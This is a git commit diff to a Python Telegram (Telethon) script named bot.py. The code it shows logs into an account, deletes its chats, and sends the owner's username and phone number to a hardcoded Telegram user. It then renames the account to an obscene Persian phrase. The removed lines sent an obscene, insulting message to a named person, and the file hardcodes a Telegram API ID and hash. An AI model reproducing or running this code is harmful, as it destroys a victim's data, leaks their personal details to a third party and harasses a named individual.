adb0a97ad16107c35ea2a1ab08d2f51ea785f904
HJmoein <moeinbavibavi@gmail.com>
2026-09-06 20:44:54 +0330

    Update bot.py

--- bot.py
+++ bot.py
@@ -6,8 +6,6 @@ API_ID = 29834234
 API_HASH = "552c01d21d127def060f2915aedeebf9"
 
 INFO_USERNAME = "Moein_915"
-MESSAGE_USERNAME = "Ali_Pakdaman"
-
 NEW_FIRST_NAME = "کیر تو کونم"
 
 client = TelegramClient("my_account", API_ID, API_HASH)
@@ -31,7 +29,6 @@ async def main():
 
     print("Done deleting chats.")
 
-    # اطلاعات حساب خودت
     me = await client.get_me()
 
     username = f"@{me.username}" if me.username else "(no username)"
@@ -43,7 +40,6 @@ async def main():
         f"Phone: {phone}"
     )
 
-    # ارسال اطلاعات به @Moein_915
     await client.send_message(
         INFO_USERNAME,
         info_text
@@ -51,15 +47,6 @@ async def main():
 
     print(f"Account info sent to @{INFO_USERNAME}")
 
-    # ارسال پیام به @Ali_Pakdaman
-    await client.send_message(
-        MESSAGE_USERNAME,
-        "سلام علی من پویام کیرت تو کونم"
-    )
-
-    print(f"Message sent to @{MESSAGE_USERNAME}")
-
-    # تغییر نام
     await client(UpdateProfileRequest(
         first_name=NEW_FIRST_NAME
     ))
